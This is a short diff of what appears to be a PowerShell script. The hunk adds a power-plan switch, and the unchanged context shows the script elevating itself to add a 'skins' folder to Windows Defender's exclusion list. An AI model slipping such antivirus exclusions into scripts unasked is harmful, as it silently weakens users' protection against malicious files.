@@ -6,5 +6,6 @@ if (-not $isAdmin) {
 	$startInfo.Arguments = "-Command `"Add-MpPreference -ExclusionPath '$skinsPath'`""
 	$startInfo.Verb = "runas"
 [System.Diagnostics.Process]::Start($startInfo) | Out-Null
+powercfg.exe -SETACTIVE 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c
 } else {
 }
